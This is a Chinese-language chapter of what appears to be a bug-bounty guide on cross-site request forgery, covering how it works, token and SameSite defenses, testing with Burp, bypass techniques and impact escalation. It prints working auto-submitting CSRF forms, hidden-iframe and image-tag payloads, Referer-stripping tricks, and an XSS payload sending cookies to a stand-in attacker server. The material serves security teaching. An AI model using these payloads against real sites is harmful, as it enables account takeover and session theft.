# 第9章：跨站请求伪造（Cross-Site Request Forgery）

跨站请求伪造（CSRF）是一种用于攻击 Web 应用程序其他用户的客户端技术。利用 CSRF，攻击者可以发送伪装成来自受害者的 HTTP 请求，以受害者名义执行非预期的操作。例如，攻击者可以在未经你许可的情况下更改你的密码或从你的银行账户转账。

CSRF 攻击专门针对状态更改请求（如发送推文和修改用户设置），而不是泄露敏感用户信息的请求。这是因为攻击者无法读取 CSRF 攻击期间发送的伪造请求的响应。让我们深入了解这种攻击的工作原理。

## 机制

回忆第 3 章的内容，大多数现代 Web 应用程序通过会话 Cookie 来认证用户并管理用户会话。当你首次登录网站时，Web 服务器会建立一个新会话：它向你的浏览器发送一个与会话关联的会话 Cookie，这个 Cookie 向服务器证明你的身份。你的浏览器存储与该网站关联的会话 Cookie，并在你向该站点发送的每个后续请求中一并发送。这一切都是自动发生的，无需用户参与。

例如，当你登录 Twitter 时，Twitter 服务器通过名为 `Set-Cookie` 的 HTTP 响应头向你的浏览器发送会话 Cookie：

```
Set-Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE;
```

你的浏览器接收会话 Cookie 并存储它，然后在你的每个 Twitter 请求中通过 `Cookie` HTTP 请求头发送它。这就是服务器知道你的请求是合法的方式：

```
Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE;
```

凭借会话 Cookie，你可以执行已认证的操作，如访问机密信息、更改密码或发送私信，而无需重新输入密码。要获取你自己的会话 Cookie，可以在登录后拦截浏览器发送给站点的请求。

现在假设 Twitter 的网页上有一个 “发送推文” 的 HTML 表单。用户可以使用此表单输入推文并点击提交按钮发送（图 9-1）。

*（图 9-1：允许用户发送推文的示例 HTML 表单）*

请注意，Twitter 实际上并不使用此表单（而且 Twitter 实际的 “发送推文” 功能不易受 CSRF 攻击）。示例 HTML 表单的源代码看起来像这样：

```html
<html>
① <h1>Send a tweet.</h1>
② <form method="POST" action="https://twitter.com/send_a_tweet">
③   <input type="text" name="tweet_content" value="Hello world!">
④   <input type="submit" value="Submit">
</form>
</html>
```

`<h1>` 标签表示一级 HTML 标题 ①，而 `<form>` 标签定义 HTML 表单的开始和结束 ②。该表单的 `method` 属性为 `POST`，`action` 属性为 `https://twitter.com/send_a_tweet`，意味着用户点击提交时，表单将向 `https://twitter.com/send_a_tweet` 端点提交 POST 请求。接下来，一个 `<input>` 标签定义了一个文本输入框，默认值为 `Hello world!`。提交表单时，该字段中的任何用户输入都将作为名为 `tweet_content` 的 POST 参数发送 ③。第二个输入标签定义了提交按钮 ④。用户点击此按钮时，表单将被提交。

当你点击页面上的提交按钮时，浏览器会向 `https://twitter.com/send_a_tweet` 发送 POST 请求，并自动包含你的 Twitter 会话 Cookie。你可以在代理中查看表单生成的请求，它应该类似这样：

```
POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

(POST request body)
tweet_content="Hello world!"
```

该功能存在一个漏洞：任何站点（而不仅仅是 Twitter）都可以发起此请求。想象攻击者托管自己的网站，显示一个如图 9-2 所示的 HTML 表单。

*（图 9-2：攻击者用于利用 CSRF 漏洞的示例 HTML 表单）*

页面的源代码为：

```html
<html>
<h1>Please click Submit.</h1>
<form method="POST" action="https://twitter.com/send_a_tweet" id="csrf-form">
  <input type="text" name="tweet_content" value="Follow @vickieli7 on Twitter!">
  <input type='submit' value="Submit">
</form>
</html>
```

当你点击此页面上的提交按钮时，你的浏览器会发送 POST 请求。由于浏览器会自动将对 Twitter 的请求中包含你的 Twitter 会话 Cookie，Twitter 将视该请求为有效，导致你的账户发送 “Follow @vickieli7 on Twitter!” 的推文。对应的请求如下：

```
POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

(POST request body)
tweet_content="Follow @vickieli7 on Twitter!"
```

尽管此请求并非来自 Twitter，但 Twitter 会认为它有效，因为它包含了你的真实 Twitter 会话 Cookie。此攻击会让你每次点击恶意页面上的提交按钮时都发送推文。

诚然，这个攻击页面不是很有用：它需要受害者点击按钮，大多数用户可能不会这样做。攻击者如何让利用更可靠呢？实际上，恶意的 CSRF 页面更可能像这样：

```html
<html>
<iframe style="display:none" name="csrf-frame"> ①
  <form method="POST" action="https://twitter.com/send_a_tweet"
        target="csrf-frame" id="csrf-form"> ②
    <input type="text" name="tweet_content" value="Follow @vickieli7 on Twitter!">
    <input type='submit' value="Submit">
  </form>
</iframe>
<script>document.getElementById("csrf-form").submit();</script> ③
</html>
```

此 HTML 将表单放在一个不可见的 iframe 中，以使其对用户不可见。回忆第 8 章，iframe 是一个 HTML 元素，用于在当前 HTML 文档中嵌入另一个文档。这个 iframe 的 `style` 设置为 `display:none`，表示不会在页面上显示，使表单不可见 ①。然后，`<script>` 标签之间的 JavaScript 代码 ③ 会自动提交 ID 为 `csrf-form` 的表单 ②，无需用户交互。代码通过 ID `csrf-form` 获取 HTML 表单，然后调用其 `submit()` 方法提交表单。使用这个新的攻击页面，任何访问恶意站点的受害者都将被迫发送推文。

攻击者利用真实的 CSRF 漏洞实际能实现什么，取决于漏洞被发现的位置。例如，假设清空用户在线购物车的请求存在 CSRF 漏洞。在现实中被利用时，该漏洞最多只能给站点用户带来不便，不会造成重大经济损失或身份盗窃。

另一方面，某些 CSRF 可能导致更大的问题。例如，如果更改用户密码的请求存在 CSRF 漏洞，攻击者可以违背其他用户意愿更改其密码，从而完全接管其账户！当 CSRF 出现在处理用户财务的功能（如账户余额转账）中时，攻击者可能未经授权从受害者银行账户转出资金。你还可以利用 CSRF 触发注入漏洞，如 XSS 和命令注入。

## 防御措施

防止 CSRF 的最佳方法是使用 **CSRF 令牌**。应用程序可以在其网站的每个表单中嵌入这些随机且不可预测的字符串，浏览器会在每个状态更改请求中发送此字符串。当请求到达服务器时，服务器可以验证令牌，确保请求确实来自其网站。此 CSRF 令牌应对每个会话和/或 HTML 表单唯一，以便攻击者无法猜测令牌值并将其嵌入其网站。令牌应具有足够的熵，使其无法通过跨会话分析令牌来推断。

服务器生成随机 CSRF 令牌，并将正确的 CSRF 令牌嵌入合法站点的表单中。注意用于指定 CSRF 令牌的新输入字段：

```html
<form method="POST" action="https://twitter.com/send_a_tweet">
  <input type="text" name="tweet_content" value="Hello world!">
  <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b">
  <input type="submit" value="Submit">
</form>
```

Twitter 的服务器可以要求浏览器在请求中发送正确的 `csrf_token` POST 参数值，请求才能成功。如果 `csrf_token` 的值缺失或不正确，服务器应将请求视为伪造并拒绝。

以下是生成的 POST 请求：

```
POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

(POST request body)
tweet_content="Hello world!"&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

许多框架内置了 CSRF 令牌，因此通常你可以直接使用框架的实现。

除了实现 CSRF 令牌来确保请求的真实性外，另一种防止 CSRF 的方法是使用 **SameSite Cookie**。`Set-Cookie` 头允许使用几个可选标志来保护用户 Cookie，其中之一是 `SameSite` 标志。当 Cookie 上的 `SameSite` 标志设置为 `Strict` 时，客户端浏览器不会在跨站请求中发送该 Cookie：

```
Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
```

`SameSite` 标志的另一个可能设置是 `Lax`，它告诉客户端浏览器仅在引起顶级导航的请求中发送 Cookie（即用户主动点击链接导航到该站点时）。此设置确保如果跨站请求是有意的，用户仍能访问你站点的资源。例如，如果你从第三方站点导航到 Facebook，你的 Facebook 登录信息会被发送。但如果第三方站点向 Facebook 发起 POST 请求或试图在 iframe 中嵌入 Facebook 内容，则不会发送 Cookie：

```
Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax
```

指定 `SameSite` 属性是对 CSRF 的良好防护，因为 `Strict` 和 `Lax` 设置都会阻止浏览器在跨站表单 POST 或 AJAX 请求以及 iframe 和图片标签中发送 Cookie。这使得经典的 CSRF 隐藏表单攻击失效。

2020 年，Chrome 和其他几个浏览器将 `SameSite=Lax` 设为默认 Cookie 设置（如果 Web 应用程序未明确设置）。因此，即使 Web 应用程序未实现 CSRF 保护，攻击者也无法攻击使用 Chrome 的受害者进行 POST CSRF。由于 Chrome 拥有最大的浏览器市场份额，经典 CSRF 攻击的效果可能会大大降低。在 Firefox 上，SameSite 默认设置是一项需要启用的功能，你可以通过进入 `about:config` 并将 `network.cookie.sameSite.laxByDefault` 设置为 `true` 来启用它。

即使浏览器采用 SameSite 默认策略，在某些条件下 CSRF 仍然可能发生。首先，如果站点允许使用 GET HTTP 方法进行状态更改请求，第三方站点可以通过 GET 请求创建 CSRF 来攻击用户。例如，如果站点允许通过 GET 请求更改密码，你可以发布这样的链接诱骗用户点击：`https://email.example.com/password_change?new_password=abc123`。由于点击此链接会引起顶级导航，用户的会话 Cookie 将包含在 GET 请求中，CSRF 攻击将成功：

```
GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
```

另一种场景是站点手动将 Cookie 的 `SameSite` 属性设置为 `None`。某些 Web 应用程序具有需要第三方站点发送跨站已认证请求的功能。在这种情况下，你可能显式将会话 Cookie 的 `SameSite` 设置为 `None`，允许跨源发送 Cookie，因此传统 CSRF 攻击仍然有效。最后，如果受害者使用的浏览器默认不将 `SameSite` 属性设为 `Lax`（包括 Firefox、Internet Explorer 和 Safari），且目标应用程序未实施周密的 CSRF 保护，传统 CSRF 攻击仍然有效。

我们将在本章后面探讨绕过 CSRF 保护的其他方法。现在只需记住：当网站未对每个状态更改请求实施 SameSite Cookie 或其他 CSRF 保护时，如果用户未使用 SameSite 默认浏览器，该请求就容易受到 CSRF 攻击。尽管浏览器采用了 SameSite 默认策略，CSRF 防护仍然是网站的责任。

## 寻找 CSRF

CSRF 很常见且容易利用。要寻找它们，首先发现未受 CSRF 防护保护的状态更改请求。以下是三步流程。请记住，由于 Chrome 等浏览器提供自动 CSRF 保护，你需要使用其他浏览器（如 Firefox）进行测试。

### 第 1 步：识别状态更改操作

更改用户数据的操作称为状态更改操作。例如，发送推文和修改用户设置都属于状态更改。发现 CSRF 的第一步是登录目标站点并浏览，寻找任何更改数据的活动。

例如，假设你正在测试 `email.example.com`，这是 example.com 处理电子邮件的子域。遍历应用程序的所有功能，点击所有链接。使用 Burp 等代理拦截生成的请求，并记录其 URL 端点。

逐一记录这些端点，形成类似下面的列表，以便稍后重新访问和测试：

**email.example.com 上的状态更改请求**

- **更改密码**：`email.example.com/password_change`
  - POST 请求
  - 请求参数：`new_password`
- **发送邮件**：`email.example.com/send_email`
  - POST 请求
  - 请求参数：`draft_id`, `recipient_id`
- **删除邮件**：`email.example.com/delete_email`
  - POST 请求
  - 请求参数：`email_id`

### 第 2 步：寻找 CSRF 防护缺失

现在访问这些端点以测试 CSRF。首先，打开 Burp Suite，在 Proxy 选项卡中开始拦截所有发往目标站点的请求。切换 Intercept 按钮，直到显示 `Intercept is on`（图 9-3）。

*（图 9-3：设置为 Intercept is on 以捕获浏览器流量。点击 Forward 按钮将当前请求转发到服务器。）*

在主动寻找 CSRF 时，让 Burp 在后台运行以记录与目标站点相关的其他流量。持续点击 Forward 按钮，直到遇到与状态更改操作关联的请求。例如，假设你正在测试发现的密码更改功能是否易受 CSRF 攻击。你已在 Burp 代理中拦截到该请求：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123
```

在拦截的请求中，寻找 CSRF 保护机制的迹象。使用窗口底部的搜索栏搜索字符串 `"csrf"` 或 `"state"`。CSRF 令牌不仅可能以 POST 主体参数的形式出现，有时也会出现在请求头、Cookie 和 URL 参数中。例如，它们可能像 Cookie 一样出现：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

(POST request body)
new_password=abc123
```

但即使你在端点上发现了 CSRF 保护，你也可以尝试各种保护绕过技术。我将在本章后面讨论它们。

### 第 3 步：确认漏洞

找到潜在易受攻击的端点后，你需要确认漏洞。你可以构造一个模仿合法站点请求的恶意 HTML 表单。

在文本编辑器中构造如下 HTML 页面，并确保以 `.html` 扩展名保存！这样，你的计算机会默认用浏览器打开该文件：

```html
<html>
<form method="POST" action="https://email.example.com/password_change" id="csrf-form"> ①
  <input type="text" name="new_password" value="abc123"> ②
  <input type="submit" value="Submit"> ③
</form>
<script>document.getElementById("csrf-form").submit();</script> ④
</html>
```

`<form>` 标签指定你正在定义 HTML 表单。表单的 `method` 属性指定请求的 HTTP 方法，`action` 属性指定请求发送的目标位置 ①。该表单生成一个指向 `https://email.example.com/password_change` 端点的 POST 请求。接下来是两个输入标签。第一个定义了一个名为 `new_password`、值为 `abc123` 的 POST 参数 ②。第二个指定提交按钮 ③。最后，页面底部的 `<script>` 标签包含自动提交表单的 JavaScript 代码 ④。

在已登录目标站点的浏览器中打开此 HTML 页面。该表单将生成类似下面的请求：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123
```

检查你在 `email.example.com` 上的密码是否已更改为 `abc123`。换句话说，检查目标服务器是否接受了你的 HTML 页面生成的请求。目标是证明外部站点可以代表用户执行状态更改操作。

最后，某些网站可能缺少 CSRF 令牌，但仍通过检查请求的 Referer 头是否匹配合法 URL 来防御 CSRF。检查 Referer 头可以防御 CSRF，因为这些头帮助服务器过滤来自外部站点的请求。确认此类 CSRF 漏洞可以帮助你排除具有基于 Referer 的 CSRF 保护的端点。

但开发人员需要记住，Referer 头可以被攻击者操纵，并非万无一失的缓解方案。开发人员应结合使用 CSRF 令牌和 SameSite 会话 Cookie 以获得最佳保护。

## 绕过 CSRF 保护

现代网站正变得更加安全。如今，当你检查处理敏感操作的请求时，它们通常会有某种形式的 CSRF 保护。然而，存在保护并不意味着保护全面、实现良好且无法绕过。如果保护不完整或有缺陷，你仍然可能通过对载荷进行一些修改来实现 CSRF 攻击。让我们讨论可用于绕过网站上实施的 CSRF 保护的技术。

### 利用点击劫持

如果端点使用 CSRF 令牌，但页面本身容易受到点击劫持（第 8 章讨论的攻击），你可以利用点击劫持达到与 CSRF 相同的效果。

这是因为在点击劫持攻击中，攻击者使用 iframe 将页面嵌入恶意站点，同时让状态更改请求源自合法站点。如果易受攻击端点所在的页面容易受到点击劫持，你就能在该端点上实现与 CSRF 攻击相同的效果，尽管需要更多努力和 CSS 技能。

使用如下 HTML 页面检查页面是否可被点击劫持。你可以通过将 URL 指定为 `<iframe>` 标签的 `src` 属性来将页面放入 iframe。然后在浏览器中渲染该 HTML 页面。如果状态更改功能所在的页面出现在你的 iframe 中，则该页面容易受到点击劫持：

```html
<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
<iframe src="PAGE_URL" width="500" height="500"></iframe>
</body>
</html>
```

然后你可以使用点击劫持诱骗用户执行状态更改操作。请参阅第 8 章了解此攻击的工作原理。

### 更改请求方法

绕过 CSRF 保护的另一个技巧是更改请求方法。有时站点会为同一端点接受多种请求方法，但并非每种方法都设置了保护。通过更改请求方法，你可能能够在未遇到 CSRF 保护的情况下执行操作。

例如，假设密码更改端点的 POST 请求受 CSRF 令牌保护，如下所示：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

你可以尝试以 GET 请求发送相同请求，看看能否不提供 CSRF 令牌而成功：

```
GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
```

此时，你的恶意 HTML 页面可以简单地这样构造：

```html
<html>
<img src="https://email.example.com/password_change?new_password=abc123"/>
</html>
```

HTML `<img>` 标签从外部来源加载图片，它会向 `src` 属性指定的 URL 发送 GET 请求。

如果加载此 HTML 页面后密码发生了更改，你可以确认该端点通过 GET 请求易受 CSRF 攻击。另一方面，如果原始操作通常使用 GET 请求，你可以尝试将其转换为 POST 请求。

### 绕过服务器存储的 CSRF 令牌

但如果点击劫持和更改请求方法都无效呢？如果站点通过令牌实现 CSRF 保护，你可以尝试以下几件事。

仅仅因为站点使用 CSRF 令牌，并不意味着它正确验证了这些令牌。如果站点未以正确方式验证 CSRF 令牌，你仍然可以通过对恶意 HTML 页面进行一些修改来实现 CSRF。

首先，尝试删除令牌参数或发送空白令牌参数。例如，这将发送不带 `csrf_token` 参数的请求：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123
```

你可以使用如下 HTML 表单生成此请求：

```html
<html>
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

下面的请求将发送一个空白的 `csrf_token` 参数：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123&csrf_token=
```

你可以使用如下 HTML 表单生成此载荷：

```html
<html>
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type="text" name="csrf_token" value="">
  <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

删除令牌参数或发送空白令牌通常有效，因为存在常见的应用程序逻辑错误。应用程序有时仅在令牌存在或令牌参数非空时才检查令牌的有效性。不安全应用程序的验证机制代码可能大致如下：

```python
def validate_token():
    if request.csrf_token == session.csrf_token: ①
        pass
    else:
        throw_error("CSRF token incorrect. Request rejected.") ②
    [...]

def process_state_changing_action():
    if request.csrf_token:
        validate_token()
    execute_action() ③
```

这段 Python 代码首先检查 CSRF 令牌是否存在 ①。如果存在，代码将继续验证令牌。如果令牌有效，代码继续执行。如果令牌无效，代码将停止执行并产生错误 ②。另一方面，如果令牌不存在，代码将跳过验证并立即执行操作 ③。在这种情况下，发送不带令牌或令牌为空的请求可能导致服务器根本不尝试验证令牌。

你还可以尝试使用另一个会话的 CSRF 令牌提交请求。这有时有效，因为某些应用程序可能仅检查令牌是否有效，而不确认它属于当前用户。假设受害者的令牌是 `871caef0757a4ac9691aceb9aad8b65b`，而你的是 `YOUR_TOKEN`。虽然获取受害者令牌很困难，但你可以轻松获取自己的令牌，因此尝试在合法令牌位置提供你自己的令牌。如果你不想使用自己的令牌，也可以创建另一个测试账户来生成令牌。例如，你的利用代码可能如下所示：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123&csrf_token=YOUR_TOKEN
```

有缺陷的应用程序逻辑可能如下所示：

```python
def validate_token():
    if request.csrf_token:
        if request.csrf_token in valid_csrf_tokens: ①
            pass
        else:
            throw_error("CSRF token incorrect. Request rejected.")
    [...]

def process_state_changing_action():
    validate_token()
    execute_action() ②
```

这里的 Python 代码首先验证 CSRF 令牌。如果令牌在当前有效令牌列表中 ①，则继续执行并执行状态更改操作 ②。否则，生成错误并停止执行。如果是这种情况，你可以将自己的 CSRF 令牌插入恶意请求！

### 绕过双重提交 CSRF 令牌

站点也常用双重提交 Cookie 作为 CSRF 防御。在这种技术中，状态更改请求同时包含相同的随机令牌作为 Cookie 和请求参数，服务器检查两个值是否相等。如果值匹配，则认为请求合法；否则应用程序拒绝它。例如，以下请求将被视为有效，因为用户 Cookie 中的 `csrf_token` 与 POST 请求参数中的 `csrf_token` 匹配：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

而以下请求会失败。注意用户 Cookie 中的 `csrf_token` 与 POST 请求参数中的 `csrf_token` 不同。在双重提交令牌验证系统中，令牌本身是否有效并不重要。服务器只检查 Cookie 中的令牌是否与请求参数中的令牌相同：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969

(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

如果应用程序使用双重提交 Cookie 作为 CSRF 防御机制，它可能不会在服务器端记录有效令牌。如果服务器在服务器端记录了 CSRF 令牌，它只需在令牌发送时验证即可，应用程序起初就不需要双重提交 Cookie。

服务器无法知道收到的任何令牌是否真正合法；它只是检查 Cookie 中的令牌与请求体中的令牌是否相同。换句话说，这个请求（将相同的伪造值作为 Cookie 和请求参数输入）也会被视为合法：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token

(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```

通常，你不应具备更改其他用户 Cookie 的能力。但如果你能找到一种方法让受害者浏览器发送伪造的 Cookie，你就能执行 CSRF。

攻击将分为两步：首先，你使用会话固定技术让受害者浏览器将你选择的任意值存储为 CSRF 令牌 Cookie。会话固定是一种允许攻击者选择受害者会话 Cookie 的攻击。本书不介绍会话固定，但你可以阅读维基百科（https://en.wikipedia.org/wiki/Session_fixation）。然后，你使用与 Cookie 中相同的 CSRF 令牌执行 CSRF。

### 绕过 CSRF Referer 头检查

如果目标站点不使用 CSRF 令牌，而是检查 Referer 头呢？服务器可能会验证状态更改请求中发送的 Referer 头是否属于网站白名单域。如果是，则执行请求；否则，视为伪造并拒绝。如何绕过此类保护？

首先，你可以尝试移除 Referer 头。像发送空白令牌一样，有时绕过 Referer 检查所需的全部操作就是不发送 Referer 头。要移除 Referer 头，请在托管请求表单的页面中添加 `<meta>` 标签：

```html
<html>
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

这个特定的 `<meta>` 标签告诉浏览器不要在生成的 HTTP 请求中包含 Referer 头。

有缺陷的应用程序逻辑可能如下所示：

```python
def validate_referer():
    if request.referer in allowlisted_domains:
        pass
    else:
        throw_error("Referer incorrect. Request rejected.")
    [...]

def process_state_changing_action():
    if request.referer:
        validate_referer()
    execute_action()
```

由于应用程序仅在 Referer 头存在时才验证它，你只需让受害者浏览器省略 Referer 头即可成功绕过 CSRF 保护！

你还可以尝试绕过用于验证 Referer URL 的逻辑检查。假设应用程序在 Referer URL 中查找字符串 `"example.com"`，如果 Referer URL 包含该字符串，则视为合法；否则拒绝：

```python
def validate_referer():
    if request.referer:
        if "example.com" in request.referer:
            pass
        else:
            throw_error("Referer incorrect. Request rejected.")
    [...]

def process_state_changing_action():
    validate_referer()
    execute_action()
```

在这种情况下，你可以通过在 Referer URL 中将受害者域名作为子域放置来绕过 Referer 检查。你可以创建一个以受害者域命名的子域，并在该子域上托管恶意 HTML。你的请求将如下所示：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
Referer: example.com.attacker.com

(POST request body)
new_password=abc123
```

你也可以尝试将受害者域名作为路径名放置在 Referer URL 中。你可以创建一个以目标域名命名的文件，并在那里托管 HTML 页面：

```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
Referer: attacker.com/example.com

(POST request body)
new_password=abc123
```

将 HTML 页面上传到正确位置后，加载该页面并查看状态更改操作是否被执行。

### 利用 XSS 绕过 CSRF 保护

此外，如第 6 章所述，任何 XSS 漏洞都能击败 CSRF 保护，因为 XSS 允许攻击者窃取合法 CSRF 令牌，然后使用 XMLHttpRequest 构造伪造请求。通常，攻击者会将 XSS 作为起点，发起 CSRF 以接管管理员账户。

## 提升攻击影响

发现 CSRF 漏洞后，不要立即报告！以下是几种将 CSRF 升级为严重安全问题的方法，以最大化报告的影响。通常，你需要将 CSRF 与其他轻微设计缺陷结合使用来发现这些。

### 通过 CSRF 泄露用户信息

CSRF 有时可能作为副作用导致信息泄露。应用程序通常根据用户偏好发送或披露信息。如果你能通过 CSRF 更改这些设置，就可以为敏感信息披露铺路。

例如，假设 example.com Web 应用程序每月向用户指定的邮箱发送账单邮件。这些邮件包含用户的账单信息，包括街道地址、电话号码和信用卡信息。发送账单邮件的邮箱地址可以通过以下请求更改：

```
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
email=NEW_EMAIL&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

不幸的是，此端点上的 CSRF 验证存在缺陷，服务器接受空白令牌。即使 `csrf_token` 字段留空，请求也会成功：

```
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
email=NEW_EMAIL&csrf_token=
```

攻击者可以让受害者用户通过 CSRF 发送此请求，更改其账单邮件的接收地址：

```
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
email=ATTACKER_EMAIL&csrf_token=
```

此后所有账单邮件都将发送到攻击者的邮箱，直到受害者注意到未经授权的更改。一旦账单邮件发送到攻击者邮箱，攻击者即可收集敏感信息，如街道地址、电话号码和与该账户关联的信用卡信息。

### 通过 CSRF 创建存储型自 XSS

回忆第 6 章，自 XSS 是一种需要受害者输入 XSS 载荷的 XSS 攻击。这些漏洞几乎总被视为非问题，因为它们太难利用；需要受害者大量操作，因此你不太可能成功。然而，当你将 CSRF 与自 XSS 结合时，通常可以将自 XSS 转变为存储型 XSS。

例如，假设 example.com 的金融子域 `finance.example.com` 允许用户为其每个关联银行账户创建昵称。账户昵称字段存在自 XSS 漏洞：该字段对用户输入没有清理、验证或转义。但只有用户自己能编辑和查看该字段，因此攻击者无法直接触发 XSS。

然而，用于更改账户昵称的端点存在 CSRF 漏洞。应用程序未正确验证 CSRF 令牌的存在，因此只需在请求中省略令牌参数即可绕过 CSRF 保护。例如，此请求会失败，因为它包含错误的令牌：

```
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>"
&csrf_token=WRONG_TOKEN
```

但此请求（完全没有令牌）会成功：

```
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>"
```

此请求将更改用户的账户昵称，并将 XSS 载荷存储在那里。下次用户登录并查看仪表板时，将触发 XSS。

### 通过 CSRF 接管用户账户

有时 CSRF 甚至可能导致账户接管。这种情况也并不少见；当 CSRF 漏洞存在于关键功能（如创建密码、更改密码、更改邮箱地址或重置密码的代码）中时，就会发生账户接管。

例如，假设除了使用邮箱和密码注册外，example.com 还允许用户通过社交媒体账户注册。如果用户选择此选项，则无需创建密码，因为他们只需通过关联账户登录即可。但为了给用户另一种选择，通过社交媒体注册的用户可以通过以下请求设置新密码：

```
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
password=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

由于用户是通过社交媒体账户注册的，他们无需提供旧密码即可设置新密码，因此如果此端点上的 CSRF 保护失败，攻击者将能够为任何通过社交媒体注册且尚未设置密码的用户设置密码。

假设应用程序未正确验证 CSRF 令牌，接受空值。以下请求将为任何尚未设置密码的用户设置密码：

```
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
password=XXXXX&csrf_token=
```

现在，攻击者只需在站点用户常访问的页面上发布此 HTML 页面的链接，即可自动为任何访问恶意页面的用户分配密码：

```html
<html>
<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
  <input type="text" name="new_password" value="this_account_is_now_mine">
  <input type="text" name="csrf_token" value="">
  <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

之后，攻击者可以自由使用新分配的密码 `this_account_is_now_mine` 登录任何受影响的受害者账户。

虽然我遇到的大多数 CSRF 都是低严重性问题，但有时关键端点上的 CSRF 可能导致严重后果。

## 交付 CSRF 载荷

在漏洞赏金报告中，你经常需要向公司展示攻击者可以可靠地交付 CSRF 载荷。攻击者有哪些选择？

交付 CSRF 载荷的第一个也是最简单的选择是诱骗用户访问外部恶意站点。例如，假设 example.com 有一个用户常去的论坛。在这种情况下，攻击者可以在论坛上发布如下链接，鼓励用户访问其页面：

```
Visit this page to get a discount on your example.com subscription:
https://example.attacker.com
```

在 `example.attacker.com` 上，攻击者可以托管自动提交表单以执行 CSRF：

```html
<html>
<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
  <input type="text" name="new_password" value="this_account_is_now_mine">
  <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

对于可以通过 GET 请求执行的 CSRF，攻击者通常可以直接将请求作为图片嵌入——例如，作为发布到论坛的图片。这样，任何查看论坛页面的用户都会受到影响：

```html
<img src="https://email.example.com/set_password?new_password=this_account_is_now_mine">
```

最后，攻击者可以通过利用存储型 XSS 向大量受众交付 CSRF 载荷。如果论坛评论字段存在此漏洞，攻击者可以在那里提交存储型 XSS 载荷，使任何论坛访客执行攻击者的恶意脚本。在恶意脚本中，攻击者可以包含发送 CSRF 载荷的代码：

```html
<script>
document.body.innerHTML += "
  <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
    <input type="text" name="new_password" value="this_account_is_now_mine">
    <input type='submit' value="Submit">
  </form>";
document.getElementById("csrf-form").submit();
</script>
```

这段 JavaScript 代码将我们的利用表单添加到用户当前页面，然后自动提交该表单。
